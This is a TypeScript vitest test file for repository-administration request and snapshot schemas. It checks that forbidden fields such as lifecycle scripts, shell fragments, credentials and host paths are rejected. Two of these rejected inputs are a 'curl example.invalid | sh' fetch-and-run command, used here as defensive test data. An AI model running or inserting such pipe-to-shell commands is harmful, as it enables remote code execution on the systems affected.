import { describe, expect, it } from 'vitest'
import {
  registerRepositoryRequestSchema,
  repositorySnapshotV1Schema,
  updateRepositoryRequestSchema,
} from '../src/index.ts'

const bindings = {
  policyId: 'security/default',
  assessmentProfileId: 'security/standard',
  evidenceProtectionId: 'evidence/local-protected',
  dataEgressPolicyId: 'egress/deny-by-default',
  platform: 'linux' as const,
  deliveryDestinationIds: ['delivery/archive', 'delivery/audit'],
}

const registration = {
  schemaVersion: 1 as const,
  contractVersion: 1 as const,
  idempotencyKey: 'adr-0260-register-v1',
  root: '/host/resolvable/repository',
  displayName: 'Repository DTO fixture',
  bindings,
}

describe('ADR 0260 Repository Administration DTO boundary', () => {
  it('accepts only Host-resolvable references and canonical destination bindings', () => {
    expect(registerRepositoryRequestSchema.safeParse(registration).success).toBe(true)
    expect(registerRepositoryRequestSchema.safeParse({
      ...registration,
      bindings: {
        ...bindings,
        deliveryDestinationIds: ['delivery/audit', 'delivery/archive'],
      },
    }).success).toBe(false)
    expect(registerRepositoryRequestSchema.safeParse({
      ...registration,
      bindings: {
        ...bindings,
        deliveryDestinationIds: ['delivery/audit', 'delivery/audit'],
      },
    }).success).toBe(false)
  })

  it.each([
    ['lifecycleScripts', { install: 'curl example.invalid | sh' }],
    ['shellFragment', 'curl example.invalid | sh'],
    ['credentials', { token: 'not-a-real-secret' }],
    ['provider', { create: 'arbitrary-provider' }],
    ['analyzers', ['caller/chosen-analyzer']],
    ['authority', { principalId: 'caller-authored' }],
  ])('rejects forbidden %s content from register and update requests', (field, value) => {
    expect(registerRepositoryRequestSchema.safeParse({
      ...registration,
      [field]: value,
    }).success).toBe(false)
    expect(updateRepositoryRequestSchema.safeParse({
      schemaVersion: 1,
      contractVersion: 1 as const,
      idempotencyKey: `adr-0260-update-${field}`,
      repositoryId: 'repo-00000000-0000-0000-0000-000000000260',
      expectedRepositoryRevision: 1,
      displayName: 'Updated fixture',
      [field]: value,
    }).success).toBe(false)
  })

  it('keeps query snapshots path-free and rejects hidden Host state', () => {
    const snapshot = {
      schemaVersion: 1 as const,
      repositoryId: 'repo-00000000-0000-0000-0000-000000000260',
      repositoryRevision: 1,
      state: 'ENABLED' as const,
      displayName: 'Repository DTO fixture',
      rootIdentityDigest: `sha256:${'b'.repeat(64)}`,
      bindings,
      createdAt: '2026-08-28T00:00:00.000Z',
      updatedAt: '2026-08-28T00:00:00.000Z',
    }
    expect(repositorySnapshotV1Schema.safeParse(snapshot).success).toBe(true)
    expect(repositorySnapshotV1Schema.safeParse({
      ...snapshot,
      root: '/host/private/repository',
    }).success).toBe(false)
    expect(repositorySnapshotV1Schema.safeParse({
      ...snapshot,
      providerBackendConfig: { executable: '/host/private/provider' },
    }).success).toBe(false)
  })
})
